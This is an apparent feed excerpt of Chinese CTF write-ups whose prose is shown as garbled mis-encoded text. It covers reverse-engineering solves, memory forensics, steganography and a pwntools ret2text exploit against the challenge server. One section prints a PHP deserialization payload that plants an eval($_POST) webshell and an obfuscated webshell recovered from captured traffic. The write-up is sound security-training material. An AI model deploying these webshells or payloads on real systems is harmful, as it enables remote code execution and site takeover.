class="line">System.out.println(str);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>; i3 &lt; <span class="number">18</span>; i3++) &#123;</span><br><span class="line"><span class="keyword">if</span> (iArr2[i3] != iArr[i3]) &#123;</span><br><span class="line"><span class="built_in">this</span>.input.setText(<span class="string">&quot;FLAGé”™è¯¯ï¼&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">this</span>.input.setText(<span class="string">&quot;FLAGæ­£ç¡®&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨z3è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag=[BitVec(<span class="string">f&#x27;flag<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">7</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>)]</span><br><span class="line">out=[<span class="number">102</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">28</span>, <span class="number">127</span>, <span class="number">55</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">121</span>, <span class="number">58</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">42</span>]</span><br><span class="line"></span><br><span class="line">s=[<span class="number">42</span>]*<span class="number">19</span></span><br><span class="line">ss=Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        s[i]=flag[i]^i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s[i]=flag[i]^flag[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    ss.add(s[i]==out[i])</span><br><span class="line"></span><br><span class="line">ss.check()</span><br><span class="line">m=ss.model()</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    res+=(<span class="built_in">chr</span>(m[flag[i]].as_long()))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># flag&#123;Reverse__APP</span></span><br></pre></td></tr></table></figure><p>åŠ èŠ±æ‹¬å·é—­åˆï¼Œå¾—åˆ°flagï¼šflag{Reverse__APP}</p><p>â€‹    </p><h3 id="WAY"><a href="#WAY" class="headerlink" title="WAY"></a>WAY</h3><blockquote><p>flag{md5(result)}</p></blockquote><p>æ£€æµ‹å¸¦upxå£³ï¼Œè„±å£³åIDAæŸ¥çœ‹ä¼ªç ï¼Œè¿·å®«é¢˜ï¼Œwsadä»£è¡¨ä¸Šä¸‹å·¦å³ï¼Œæå–è¿·å®«æ•°ç»„å¾—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OIIII</span><br><span class="line">OOIO#</span><br><span class="line">IOOOI</span><br><span class="line">IOIOI</span><br><span class="line">IIIII</span><br></pre></td></tr></table></figure><p>å®¹æ˜“å¾—åˆ°è·¯å¾„ï¼šsdsddwdï¼ŒMD5å¾—åˆ°flagï¼šflag{6654b3343f6f3f6223a721e7f65e87f8}</p><p>â€‹    </p><h3 id="SPARK"><a href="#SPARK" class="headerlink" title="SPARK"></a>SPARK</h3><p>Sparcæ¶æ„ï¼ŒIDAæ— æ³•åç¼–è¯‘ä¸ºä¼ªç ï¼Œç”¨Ghidraå¾—åˆ°ä¼ªç ä¸»é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  longlong unaff_g7;</span><br><span class="line">  <span class="type">int</span> local_res7d3;</span><br><span class="line">  undefined8 local_res7d7;</span><br><span class="line">  undefined8 local_res7df;</span><br><span class="line">  undefined8 local_res7e7;</span><br><span class="line">  undefined8 local_res7ef;</span><br><span class="line">  longlong local_res7f7;</span><br><span class="line">  </span><br><span class="line">  local_res7f7 = *(longlong *)(unaff_g7 + <span class="number">0x28</span>);</span><br><span class="line">  local_res7d7 = <span class="number">0</span>;</span><br><span class="line">  local_res7df = <span class="number">0</span>;</span><br><span class="line">  local_res7e7 = <span class="number">0x37463f3044413243</span>;</span><br><span class="line">  local_res7ef = <span class="number">0x3429000000000000</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input_sparkle_flag_here:\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,&amp;local_res7d7,<span class="number">0xc</span>);</span><br><span class="line">  local_res7d3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">9</span> &lt; local_res7d3) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;good_job!&quot;</span>);</span><br><span class="line">LAB_001008a0:</span><br><span class="line">      <span class="keyword">if</span> (local_res7f7 == *(longlong *)(unaff_g7 + <span class="number">0x28</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      __stack_chk_fail();</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="type">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) =</span><br><span class="line">         *(<span class="type">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) + <span class="number">-0x2f</span>;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) !=</span><br><span class="line">        *(<span class="type">char</span> *)((longlong)&amp;local_res7e7 + (longlong)local_res7d3)) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;incorrect\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LAB_001008a0;</span><br><span class="line">    &#125;</span><br><span class="line">    local_res7d3 = local_res7d3 + <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€»è¾‘ä¸ºè¾“å…¥flagå€¼é€å­—ç¬¦ <code>-0x2f</code> å¾—åˆ°çš„å­—ç¬¦ä¸²ä¸ <code>0x37463f30444132433429</code> ç›¸ç­‰ï¼Œå³ROT47ã€‚</p><p>ç®€å•è¿˜åŸå¾—flagï¼šflag{fun_sparcX}</p><p>â€‹    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Ez-pwn"><a href="#Ez-pwn" class="headerlink" title="Ez_pwn"></a>Ez_pwn</h3><p>ç®€å•ret2textï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;hsc2019.site&#x27;</span>,<span class="number">10891</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(<span class="number">0x400741</span>)</span><br><span class="line">r.sendline(pl)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;æœ¬å±ŠHSC1th 2022æ˜¯ç”±ç¤¾ä¼šæˆ˜é˜Ÿçº¢å®¢çªå‡»é˜Ÿï¼ˆHonker Security Commandoï¼‰ä¸¾åŠã€‚ æœ¬æ¬¡æ¯”èµ›å°†é‡‡ç”¨åœ¨çº¿ç½‘ç»œå®‰å…¨å¤ºæ——æŒ‘æˆ˜èµ›çš„å½¢å¼ï¼Œæ¶µç›–webï¼Œcryptoï¼Œmiscï¼Œreç­‰ä¸»æµæ–¹å‘ï¼Œå¹¶é¢å‘å…¨çƒå¼€æ”¾ã€‚æ¯”èµ›ä¸‰ç”²å¯è·çªå‡»é˜Ÿå‘¨è¾¹ç¤¼å“ã€‚</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022èµ›" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>é•¿å®‰â€œæˆ˜ç–«â€ç½‘ç»œå®‰å…¨å«å£«å®ˆæŠ¤èµ›</title>
    <link href="https://lazzzaro.github.io/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/</id>
    <published>2022-01-08T10:00:01.000Z</published>
    <updated>2022-01-08T12:51:09.214Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>æ–°å† ç–«æƒ…è‚†è™å…¨çƒï¼Œè¿™ä¸€åœºç–«æƒ…é˜»å‡»æˆ˜ä¸ä»…æ˜¯æˆ‘å›½å«ç”Ÿå¥åº·é¢†åŸŸçš„ä¸€åœºæˆ˜ç–«ï¼Œä¹Ÿæ˜¯ç§‘å­¦æŠ€æœ¯é¢†åŸŸçš„ä¸€æ¬¡å¤§è€ƒã€‚åœ¨è¿™ä¸ªç‰¹æ®Šæ—¶æœŸï¼Œä¿éšœç½‘ç»œå®‰å…¨ï¼Œé˜²èŒƒåˆ©ç”¨æ–°å† è‚ºç‚ç–«æƒ…å®æ–½çš„ç½‘ç»œæ”»å‡»è¡Œä¸ºæ˜¯å…³ç³»å¹¿å¤§äººæ°‘ç¾¤ä¼—åˆ‡èº«åˆ©ç›Šçš„å¤§äº‹ã€‚å¦‚ç½‘ç»œæ”»å‡»è€…å°†è®¡ç®—æœºç—…æ¯’ã€æœ¨é©¬å’Œç§»åŠ¨æ¶æ„ç¨‹åºç­‰ä¼ªè£…æˆâ€œè‚ºç‚ç—…ä¾‹â€â€œé˜²æŠ¤é€šçŸ¥â€ç­‰ä¿¡æ¯ï¼Œé€šè¿‡é’“é±¼é‚®ä»¶ã€æ¶æ„é“¾æ¥ç­‰æ–¹å¼è¿›è¡Œä¼ æ’­ï¼Œé€ æˆç”¨æˆ·å®‰å…¨é—®é¢˜ã€‚</p><p>è¥¿å®‰æ•°æ‰€é«˜æ ¡å­¦ç”Ÿå›¢ä½“è”åˆå‘èµ·é•¿å®‰æˆ˜ç–«ç½‘ç»œå®‰å…¨å…¬ç›Šç§‘æ™®èµ›å’Œé•¿å®‰æˆ˜ç–«â€œç½‘ç»œå®‰å…¨å«å£«â€å®ˆæŠ¤èµ›ï¼Œä¸€æ–¹é¢æå‡å…¨æ°‘ç–«æƒ…æœŸé—´çš„ç½‘ç»œå®‰å…¨æ„è¯†ä¸ç–«æƒ…ä¸­å¸¸è§é—®é¢˜çš„åº”å¯¹æªæ–½ï¼Œå¦ä¸€æ–¹é¢æå‡æˆ‘çœçš„ç½‘ç»œå®‰å…¨åº”æ€¥å“åº”èƒ½åŠ›å’Œç½‘ç»œå®‰å…¨ä»ä¸šè€…æŠ€æœ¯èƒ½åŠ›ï¼ŒååŠ©ç”¨æˆ·æå‡ç½‘ç»œå®‰å…¨é˜²æŠ¤èƒ½åŠ›ï¼Œä¸ºæˆ˜èƒœæ–°å† è‚ºç‚æä¾›ç½‘ç»œç©ºé—´ä¿éšœã€‚</p><p>Rank: 14</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="å…«å¦è¿·å®«"><a href="#å…«å¦è¿·å®«" class="headerlink" title="å…«å¦è¿·å®«"></a>å…«å¦è¿·å®«</h3><blockquote><p>ä¸€èµ·èµ°è¿·å®«å§ï¼Œè¦æäº¤å…¨æ‹¼éŸ³å­—ç¬¦å¥¥</p></blockquote><p><img src="/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/maze.png" alt="maze" style="zoom: 33%;"></p><p>èµ°è¿·å®«ï¼Œä¸²è”ç»è¿‡çš„å…«å¦å¯¹åº”æ–‡å­—ï¼š<code>cazy&#123;æˆ˜é•¿æ™é•¿æˆ˜æ™æ²³é•¿å±±å±±å®‰æˆ˜ç–«ç–«æˆ˜ç–«å®‰ç–«é•¿å®‰æ™&#125;</code>ï¼Œè½¬ä¸ºå…¨æ‹¼ï¼š</p><p><code>cazy&#123;zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang&#125;</code></p><p>â€‹    </p><h3 id="æœ´å®æ— åçš„å–è¯"><a href="#æœ´å®æ— åçš„å–è¯" class="headerlink" title="æœ´å®æ— åçš„å–è¯"></a>æœ´å®æ— åçš„å–è¯</h3><p>xpå†…å­˜å–è¯ï¼Œå…ˆåˆ¤æ–­profile</p><p><code>volatility -f xp_sp3.raw imageinfo</code></p><p>æŸ¥çœ‹è¿›ç¨‹ </p><p><code>volatility -f xp_sp3.raw --profile=WinXPSP2x86 pslist</code></p><p>å‘ç°notepadå’Œmspaintï¼ŒæŸ¥çœ‹è®°äº‹æœ¬</p><p><code>volatility -f xp_sp3.raw --profile=WinXPSP2x86 notepad</code></p><p>æ‰¾åˆ°ä¿¡æ¯ï¼š <code>20211209(Encrypt)</code>ã€‚</p><p>å†æŸ¥çœ‹æ¡Œé¢æ–‡ä»¶</p><p><code>volatility -f xp_sp3.raw --profile=WinXPSP2x86 filescan | grep -E &quot;æ¡Œé¢&quot;</code></p><p>æ‰¾åˆ°æ–‡ä»¶ <code>flag.zip</code> å’Œ <code>flag.png</code>ï¼Œåˆ†åˆ«dumpä¸‹æ¥</p><p><code>flag.png</code> ä¸­æœ‰å¯†æ–‡ä¿¡æ¯ï¼š <code>FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]</code>ï¼Œ</p><p><code>flag.zip</code> æœ‰å¯†ç ï¼Œç”¨å‰é¢çš„ <code>20211209</code> è§£å¼€æ‰¾åˆ°åŠ å¯†ç®—æ³•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Encrypt</span><span class="params">(<span class="built_in">string</span>&amp; str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; str.length(); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(str[i] &gt;=<span class="string">&#x27;a&#x27;</span>&amp;&amp; str[i]&lt;=<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">str[i]+=<span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">str[i] -= <span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿˜åŸflagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]&#x27;</span>)</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">        x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;y&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;_&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">    x -= <span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> encrypt(j) == s[i]:</span><br><span class="line">            t += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t += <span class="string">&#x27;?&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cazy&#123;Xian?will?certainly?succeed?in?fighting?the?epidemic&#125;</span></span><br></pre></td></tr></table></figure><p><code>?</code> æ”¹ <code>_</code> ï¼Œå¾—åˆ°flagï¼š<code>cazy&#123;Xian_will_certainly_succeed_in_fighting_the_epidemic&#125;</code></p><p>â€‹    </p><h3 id="æ— å­—å¤©ä¹¦"><a href="#æ— å­—å¤©ä¹¦" class="headerlink" title="æ— å­—å¤©ä¹¦"></a>æ— å­—å¤©ä¹¦</h3><p>åœ¨æµé‡åŒ…ä¸­å‘ç° <code>secret</code> æµé‡ï¼Œdumpå¾—åˆ°gzipåŒ…ï¼Œå†…å®¹ä¸ºä¸€ä¸²16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å« <code>504B0304</code>ï¼Œè½¬å­˜ä¸ºzipæ–‡ä»¶ï¼Œå†…å« <code>flag.txt</code> å’Œ <code>key.ws</code> ä¸¤ä¸ªçº¯ç©ºç™½å­—ç¬¦æ–‡ä»¶ã€‚</p><p><code>key.ws</code> ä¸­åŒ…å«ç©ºæ ¼ä¸tabå­—ç¬¦åŠå¤§é‡æ¢è¡Œç¬¦ï¼Œä¸ºwhitespaceè¯­è¨€ï¼Œ<a href="https://ideone.com/l/whitespace">åœ¨çº¿è¿è¡Œ</a>å¾—åˆ°è¾“å‡º <code>XiAnWillBeSafe</code>ï¼›</p><p><code>flag.txt</code> ä¸­åŒ…å«å¤§é‡ç©ºæ ¼ä¸tabå­—ç¬¦ï¼Œä¸ºsnowéšå†™ï¼Œå¯†ç  <code>XiAnWillBeSafe</code>ï¼Œè§£å¯†ï¼š</p><p><code>SNOW.EXE -C -p XiAnWillBeSafe flag.txt</code>ï¼Œå¾—åˆ°flagï¼š</p><p><code>cazy&#123;C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng&#125;</code></p><p>â€‹    </p><h3 id="è¥¿å®‰åŠ æ²¹"><a href="#è¥¿å®‰åŠ æ²¹" class="headerlink" title="è¥¿å®‰åŠ æ²¹"></a>è¥¿å®‰åŠ æ²¹</h3><p>åœ¨æµé‡åŒ…ä¸­å‘ç° <code>secret.txt</code> æµé‡ï¼Œdumpä¸‹æ¥base64è§£ç å¾—åˆ°zipæ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;secret.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;out.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(base64.b64decode(f))</span><br></pre></td></tr></table></figure><p>æ‰“å¼€ä¸ºæ‹¼å›¾ï¼Œå…±48å¼ ï¼Œé€‰æ‹©å¸¦flagçš„éƒ¨åˆ†å›¾ç‰‡çº¯æ‰‹æ‹¼ï¼š</p><p><img src="/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/pintu.png" alt="pintu" style="zoom: 67%;"></p><p>flagï¼š<code>cazy&#123;make_XiAN_great_Again&#125;</code></p><p>â€‹    </p><h3 id="ez-Encrypt"><a href="#ez-Encrypt" class="headerlink" title="ez_Encrypt"></a>ez_Encrypt</h3><p>æŸ¥çœ‹æµé‡ï¼Œå‘ç°æ˜¯èšå‰‘æµé‡ï¼Œå…¶ä¸­ä¸€ä¸ªæµä¸­</p><p><code>TzozOToiTGVhZ3VlXEZseXN5c3RlbVxDYWNoZWRcU3RvcmFnZVxBZGFwdGVyIjo1OntzOjc6IgAqAGZpbGUiO3M6MTE6Ii4vc2hlbGwucGhwIjtzOjEwOiIAKgBhZGFwdGVyIjtPOjMwOiJMZWFndWVcRmx5c3lzdGVtXEFkYXB0ZXJcTG9jYWwiOjE6e3M6MTM6IgAqAHdyaXRlRmxhZ3MiO2k6MDt9czo5OiIAKgBleHBpcmUiO047czoxMToiACoAYXV0b3NhdmUiO2I6MDtzOjg6IgAqAGNhY2hlIjthOjE6e2k6MDtzOjI5OiI8P3BocCBldmFsKCRfUE9TVFsnY2F6eSddKSA%2FPiI7fX0%3D</code></p><p>base64è§£ç ä¸º <code>O:39:&quot;League\Flysystem\Cached\Storage\Adapter&quot;:5:&#123;s:7:&quot;.*.file&quot;;s:11:&quot;./shell.php&quot;;s:10:&quot;.*.adapter&quot;;O:30:&quot;League\Flysystem\Adapter\Local&quot;:1:&#123;s:13:&quot;.*.writeFlags&quot;;i:0;&#125;s:9:&quot;.*.expire&quot;;N;s:11:&quot;.*.autosave&quot;;b:0;s:8:&quot;.*.cache&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[&#39;cazy&#39;]) ?&gt;&quot;;&#125;&#125;</code>ï¼Œ</p><p>è¯´æ˜é€šè¿‡ååºåˆ—åŒ–æ¼æ´å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</p><p>æ‰¾åˆ°ä¸€é•¿ä¸²base64ç¼–ç å­—ç¬¦ä¸²ï¼Œè§£ç ä¿å­˜ä¸º <code>www.zip</code> æºç ï¼Œåœ¨ <code>app\controller\Index.php</code> ä¸­æ‰¾åˆ°æ··æ·†å¤„ç†è¿‡çš„é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;IKlSux1227&#x27;</span>,<span class="keyword">__FILE__</span>);<span class="variable">$DusPFr</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqZHF0d3lpT2VBY1VaTHBDdUhuYm1ndkZzZlNhUFlsTUpCTmpSVmtLeFFEVFdJcnpFb1hHaA==&quot;</span>);<span class="variable">$arCiCL</span>=<span class="variable">$DusPFr</span>[<span class="number">3</span>].<span class="variable">$DusPFr</span>[<span class="number">6</span>].<span class="variable">$DusPFr</span>[<span class="number">33</span>].<span class="variable">$DusPFr</span>[<span class="number">30</span>];<span class="variable">$VvUrBZ</span>=<span class="variable">$DusPFr</span>[<span class="number">33</span>].<span class="variable">$DusPFr</span>[<span class="number">10</span>].<span class="variable">$DusPFr</span>[<span class="number">24</span>].<span class="variable">$DusPFr</span>[<span class="number">10</span>].<span class="variable">$DusPFr</span>[<span class="number">24</span>];<span class="variable">$DEomKk</span>=<span class="variable">$VvUrBZ</span>[<span class="number">0</span>].<span class="variable">$DusPFr</span>[<span class="number">18</span>].<span class="variable">$DusPFr</span>[<span class="number">3</span>].<span class="variable">$VvUrBZ</span>[<span class="number">0</span>].<span class="variable">$VvUrBZ</span>[<span class="number">1</span>].<span class="variable">$DusPFr</span>[<span class="number">24</span>];<span class="variable">$LnpnvY</span>=<span class="variable">$DusPFr</span>[<span class="number">7</span>].<span class="variable">$DusPFr</span>[<span class="number">13</span>];<span class="variable">$arCiCL</span>.=<span class="variable">$DusPFr</span>[<span class="number">22</span>].<span class="variable">$DusPFr</span>[<span class="number">36</span>].<span class="variable">$DusPFr</span>[<span class="number">29</span>].<span class="variable">$DusPFr</span>[<span class="number">26</span>].<span class="variable">$DusPFr</span>[<span class="number">30</span>].<span class="variable">$DusPFr</span>[<span class="number">32</span>].<span class="variable">$DusPFr</span>[<span class="number">35</span>].<span class="variable">$DusPFr</span>[<span class="number">26</span>].<span class="variable">$DusPFr</span>[<span class="number">30</span>];<span class="keyword">eval</span>(<span class="variable">$arCiCL</span>(<span 